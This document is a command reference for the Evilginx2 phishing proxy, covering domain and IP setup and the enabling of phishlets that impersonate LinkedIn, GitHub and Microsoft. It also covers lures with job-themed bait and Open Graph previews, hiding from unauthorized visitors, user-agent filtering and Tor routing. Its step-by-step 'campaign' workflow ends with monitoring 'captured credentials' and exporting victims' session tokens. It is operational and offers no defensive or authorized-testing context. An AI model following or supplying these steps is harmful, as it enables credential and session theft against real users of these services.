# Evilginx2 Commands Reference Guide

Complete reference guide for all Evilginx2 commands and their usage.

## Table of Contents
- [Getting Started](#getting-started)
- [Configuration Commands](#configuration-commands)
- [Phishlet Commands](#phishlet-commands)
- [Lure Commands](#lure-commands)
- [Session Commands](#session-commands)
- [Proxy Commands](#proxy-commands)
- [Blacklist Commands](#blacklist-commands)
- [Certificate Commands](#certificate-commands)
- [Utility Commands](#utility-commands)
- [Command Examples](#command-examples)

## Getting Started

### Launching Evilginx2

```bash
# Basic launch with phishlets directory
./evilginx -p ./phishlets

# Specify custom configuration directory
./evilginx -p ./phishlets -c /path/to/config

# Launch with debug output
./evilginx -p ./phishlets -debug

# Launch in developer mode (self-signed certificates)
./evilginx -p ./phishlets -developer

# Show version
./evilginx -v
```

### Command Line Arguments

| Argument | Description | Example |
|----------|-------------|---------|
| `-p` | Phishlets directory path | `-p ./phishlets` |
| `-c` | Configuration directory path | `-c ~/.evilginx` |
| `-t` | HTML redirector pages directory | `-t ./redirectors` |
| `-debug` | Enable debug output | `-debug` |
| `-developer` | Developer mode (self-signed certs) | `-developer` |
| `-v` | Show version | `-v` |

### Interactive Terminal

Once Evilginx2 is running, you'll see an interactive prompt:

```
evilginx> 
```

Type `help` to see available commands.

## Configuration Commands

### config

Configure general Evilginx2 settings.

#### Syntax
```
config <parameter> [value]
```

#### Parameters

##### Domain Configuration
```
config domain <domain>
```
Set the root domain for phishing. All phishlets will use subdomains of this domain.

**Example:**
```
config domain phishing-domain.com
```

##### IP Configuration
```
config ip <external_ipv4> [bind_ipv4]
```
Set the external IPv4 address (for DNS responses) and optionally the bind IP.

**Examples:**
```
config ip 1.2.3.4
config ip 1.2.3.4 0.0.0.0
```

##### Port Configuration
```
config https_port <port>
config dns_port <port>
```
Set the HTTPS and DNS server ports.

**Examples:**
```
config https_port 443
config dns_port 53
```

##### Redirect URL
```
config redirect_url <url>
```
Set the default redirect URL for unauthorized requests.

**Example:**
```
config redirect_url https://example.com
```

##### Auto Certificate
```
config autocert <on|off>
```
Enable/disable automatic certificate generation using Let's Encrypt.

**Examples:**
```
config autocert on
config autocert off
```

#### View Configuration
```
config
```
Display all current configuration settings.

## Phishlet Commands

Phishlets are templates that define how to proxy a specific website.

### phishlets

Main command for managing phishlets.

#### List All Phishlets
```
phishlets
```
Display all available phishlets and their status.

#### Enable a Phishlet
```
phishlets enable <phishlet_name>
```
Enable a specific phishlet. The phishlet must be configured with a hostname first.

**Example:**
```
phishlets enable linkedin
```

#### Disable a Phishlet
```
phishlets disable <phishlet_name>
```
Disable a phishlet.

**Example:**
```
phishlets disable linkedin
```

#### Show Phishlet Details
```
phishlets get-hosts <phishlet_name>
```
Show all hostnames required for the phishlet.

**Example:**
```
phishlets get-hosts github
```

#### Set Phishlet Hostname
```
phishlets hostname <phishlet_name> <hostname>
```
Set the hostname for a phishlet. Must be a subdomain of your configured domain.

**Example:**
```
phishlets hostname linkedin login.phishing-domain.com
```

#### Show Redirect URL
```
phishlets get-url <phishlet_name>
```
Get the redirect URL for a phishlet.

#### Set Redirect URL
```
phishlets redirect_url <phishlet_name> <url>
```
Set where victims are redirected after credential capture.

**Example:**
```
phishlets redirect_url linkedin https://linkedin.com/feed
```

#### Hide/Unhide Phishlet
```
phishlets hide <phishlet_name> <true|false>
```
Hide or unhide a phishlet from unauthorized visitors.

**Examples:**
```
phishlets hide linkedin true
phishlets hide linkedin false
```

## Lure Commands

Lures are unique URLs that trigger session creation for phishing campaigns.

### lures

Main command for managing lures.

#### Create a New Lure
```
lures create <phishlet_name>
```
Create a new lure for a phishlet.

**Example:**
```
lures create linkedin
```

#### List All Lures
```
lures
```
Display all created lures with their details.

#### Get Lure URL
```
lures get-url <lure_id>
```
Get the complete URL for a specific lure.

**Example:**
```
lures get-url 0
```

#### Delete a Lure
```
lures delete <lure_id>
```
Delete a specific lure.

**Example:**
```
lures delete 0
```

#### Edit Lure Properties

##### Set Lure Path
```
lures path <lure_id> <path>
```
Set the URL path for the lure.

**Example:**
```
lures path 0 /jobs/search
```

##### Set Redirect URL
```
lures redirect_url <lure_id> <url>
```
Set a custom redirect URL for this specific lure.

**Example:**
```
lures redirect_url 0 https://linkedin.com/feed
```

##### Set HTML Redirector
```
lures redirector <lure_id> <redirector_name>
```
Set an HTML redirector page to show before the phishing site.

**Example:**
```
lures redirector 0 linkedin_redirector
```

##### Set User-Agent Filter
```
lures ua_filter <lure_id> <regex>
```
Set a user-agent filter (regex) to only allow specific browsers/bots.

**Example:**
```
lures ua_filter 0 ".*Chrome.*"
```

##### Set Open Graph Metadata
```
lures og_title <lure_id> <title>
lures og_desc <lure_id> <description>
lures og_image <lure_id> <image_url>
lures og_url <lure_id> <url>
```
Set Open Graph tags for social media previews.

**Examples:**
```
lures og_title 0 "Join our team"
lures og_desc 0 "We're hiring! Check out opportunities"
lures og_image 0 "https://example.com/image.jpg"
lures og_url 0 "https://example.com/jobs"
```

##### Pause/Unpause Lure
```
lures pause <lure_id> <duration>
lures unpause <lure_id>
```
Temporarily pause a lure for a specified duration or unpause it.

**Examples:**
```
lures pause 0 3600    # Pause for 1 hour
lures unpause 0
```

##### Set Info Field
```
lures info <lure_id> <info_text>
```
Add notes/information about the lure.

**Example:**
```
lures info 0 "Campaign for engineering department"
```

## Session Commands

Sessions track individual phishing victims.

### sessions

Manage captured sessions and credentials.

#### List All Sessions
```
sessions
```
Display all captured sessions with their status.

#### Show Session Details
```
sessions <session_id>
```
Show detailed information about a specific session.

**Example:**
```
sessions 0
```

#### Delete a Session
```
sessions delete <session_id>
```
Delete a specific session from the database.

**Example:**
```
sessions delete 0
```

#### Delete All Sessions
```
sessions delete all
```
Clear all sessions from the database.

## Proxy Commands

Configure upstream proxy settings (including Tor for .onion support).

### proxy

Manage proxy configuration for outbound connections.

#### Enable/Disable Proxy
```
proxy <on|off>
```
Enable or disable the configured proxy.

**Examples:**
```
proxy on
proxy off
```

#### Configure Proxy
```
proxy <type> <address> <port> [username] [password]
```

**Parameters:**
- `type`: Proxy type - `http`, `https`, `socks5`, or `socks5h`
- `address`: Proxy server address (IP or hostname)
- `port`: Proxy server port
- `username`: (Optional) Authentication username
- `password`: (Optional) Authentication password

**Examples:**

For Tor (SOCKS5):
```
proxy socks5 127.0.0.1 9050
```

For Tor with hostname resolution through proxy:
```
proxy socks5h 127.0.0.1 9050
```

For HTTP proxy with authentication:
```
proxy http proxy.example.com 8080 myuser mypass
```

For HTTPS proxy:
```
proxy https proxy.example.com 8443
```

#### View Proxy Status
```
proxy
```
Display current proxy configuration and status.

### Tor Integration for v3 Onion Addresses

To access v3 onion addresses through Evilginx2:

1. **Ensure Tor is running** on your system (see INSTALL.md)
2. **Configure Evilginx2 to use Tor SOCKS proxy:**

```
proxy socks5h 127.0.0.1 9050
proxy on
```

**Note:** Use `socks5h` instead of `socks5` to resolve .onion hostnames through Tor.

3. **Test the connection:**
   - The proxy will now route all phishlet traffic through Tor
   - You can reach .onion addresses in your phishlet configurations

## Blacklist Commands

Manage IP blacklist to block malicious traffic.

### blacklist

Control IP address blacklisting.

#### Set Blacklist Mode
```
blacklist <all|unauth|noadd|off>
```

**Modes:**
- `all`: Block all blacklisted IPs
- `unauth`: Add unauthorized requests to blacklist
- `noadd`: Block blacklisted IPs but don't add new ones
- `off`: Disable blacklist

**Example:**
```
blacklist unauth
```

#### Add IP to Blacklist
```
blacklist add <ip_address>
```

**Example:**
```
blacklist add 1.2.3.4
```

#### Remove IP from Blacklist
```
blacklist delete <ip_address>
```

**Example:**
```
blacklist delete 1.2.3.4
```

#### View Blacklist
```
blacklist
```
Show all blacklisted IP addresses.

## Certificate Commands

Manage SSL/TLS certificates.

### certs

Certificate management (mostly automatic with Let's Encrypt).

#### View Certificate Status
```
certs
```
Display certificate status for all configured domains.

## Utility Commands

### clear

Clear the terminal screen.

```
clear
```

### help

Display help information.

```
help
help <command>
```

**Example:**
```
help phishlets
```

### quit / exit

Exit Evilginx2.

```
quit
exit
```

## Command Examples

### Complete Setup Workflow

Here's a complete example of setting up a phishing campaign:

```bash
# 1. Launch Evilginx2
./evilginx -p ./phishlets

# 2. Configure the server
config domain phishing-example.com
config ip 1.2.3.4

# 3. Configure Tor proxy for .onion support
proxy socks5h 127.0.0.1 9050
proxy on

# 4. Set up a phishlet
phishlets hostname linkedin login.phishing-example.com
phishlets enable linkedin

# 5. Create a lure
lures create linkedin
lures path 0 /jobs/search
lures redirect_url 0 https://linkedin.com/feed

# 6. Get the lure URL
lures get-url 0

# 7. Monitor sessions
sessions

# 8. View captured session
sessions 0
```

### Testing with Tor

```bash
# 1. Configure Tor SOCKS proxy
proxy socks5h 127.0.0.1 9050
proxy on

# 2. Verify proxy is active
proxy

# Expected output should show:
# proxy : enabled
# type  : socks5h
# address : 127.0.0.1:9050
```

### Managing Multiple Phishlets

```bash
# Enable multiple phishlets
phishlets hostname github gh.phishing-example.com
phishlets hostname linkedin ln.phishing-example.com
phishlets hostname microsoft ms.phishing-example.com

phishlets enable github
phishlets enable linkedin
phishlets enable microsoft

# Create lures for each
lures create github
lures create linkedin
lures create microsoft

# List all active configurations
phishlets
lures
```

### Session Management

```bash
# View all sessions
sessions

# View specific session details
sessions 0

# Export session tokens (copy from output)
sessions 0

# Delete old sessions
sessions delete 1
sessions delete 2

# Clear all sessions
sessions delete all
```

### Blacklist Management

```bash
# Set blacklist to auto-block unauthorized requests
blacklist unauth

# Manually add problematic IPs
blacklist add 10.0.0.5
blacklist add 192.168.1.100

# View blacklist
blacklist

# Remove an IP
blacklist delete 10.0.0.5

# Disable blacklist
blacklist off
```

## Tips and Best Practices

### Security
1. **Always use HTTPS** - Keep autocert enabled for production
2. **Enable blacklist** - Use `blacklist unauth` to auto-block suspicious IPs
3. **Hide phishlets** - Use `phishlets hide <name> true` when not in use
4. **Rotate lures** - Create new lures periodically
5. **Monitor sessions** - Regularly check for captured credentials

### Performance
1. **Use developer mode for testing** - Avoid rate limits with `-developer` flag
2. **Limit active phishlets** - Only enable phishlets you're actively using
3. **Clean old sessions** - Regularly delete old sessions to keep database small

### Tor Usage
1. **Use socks5h for .onion** - This resolves hostnames through Tor
2. **Test Tor connection** - Verify Tor is running before enabling proxy
3. **Monitor Tor logs** - Check `/var/log/tor/log` for connection issues
4. **Understand performance** - Tor adds latency; expect slower responses

### Debugging
1. **Enable debug mode** - Launch with `-debug` flag for verbose output
2. **Check logs** - Review `~/.evilginx/log/` directory
3. **Test DNS** - Ensure DNS records are correct before enabling phishlets
4. **Use developer mode** - Test with self-signed certificates first

## Keyboard Shortcuts

Within the Evilginx2 terminal:

- `Ctrl+C` - Interrupt current operation (doesn't exit)
- `Ctrl+D` or `quit` - Exit Evilginx2
- `Tab` - Auto-complete commands
- `Up/Down Arrow` - Navigate command history
- `Ctrl+L` or `clear` - Clear screen

## Error Messages

### Common Errors and Solutions

**"phishlet not enabled"**
- Enable the phishlet first: `phishlets enable <name>`

**"hostname not set"**
- Set hostname before enabling: `phishlets hostname <name> <hostname>`

**"domain not configured"**
- Set domain first: `config domain <your-domain.com>`

**"invalid proxy type selected"**
- Use valid proxy type: `http`, `https`, `socks5`, or `socks5h`

**"failed to bind to port"**
- Run with sudo or use setcap: `sudo setcap 'cap_net_bind_service=+ep' ./evilginx`

**"certificate generation failed"**
- Ensure port 80 is accessible and DNS is configured
- Or use developer mode: `-developer` flag

## Advanced Usage

### GoPhish Integration

Configure GoPhish integration for campaign management:

```bash
gophish admin <admin_url>
gophish api_key <api_key>
gophish insecure <true|false>
```

**Example:**
```bash
gophish admin https://gophish.example.com:3333
gophish api_key YOUR_API_KEY_HERE
gophish insecure false
```

### Custom Redirectors

Use custom HTML redirector pages:

```bash
# Set redirector for a lure
lures redirector 0 custom_redirector

# The redirector directory should contain index.html
# Default location: ./redirectors/custom_redirector/index.html
```

## Quick Reference Card

| Command | Description |
|---------|-------------|
| `config domain <domain>` | Set phishing domain |
| `config ip <ip>` | Set server IP |
| `proxy socks5h 127.0.0.1 9050` | Configure Tor proxy |
| `proxy on` | Enable proxy |
| `phishlets hostname <name> <host>` | Set phishlet hostname |
| `phishlets enable <name>` | Enable phishlet |
| `lures create <phishlet>` | Create lure |
| `lures get-url <id>` | Get lure URL |
| `sessions` | List all sessions |
| `sessions <id>` | View session details |
| `blacklist unauth` | Auto-blacklist unauthorized IPs |
| `help` | Show help |
| `quit` | Exit Evilginx2 |

---

**Last Updated**: 2025-11-10  
**Version**: 3.3.0

For more information:
- Installation Guide: `INSTALL.md`
- Customization Guide: `CUSTOMIZATION.md`
- Main Documentation: `README.md`
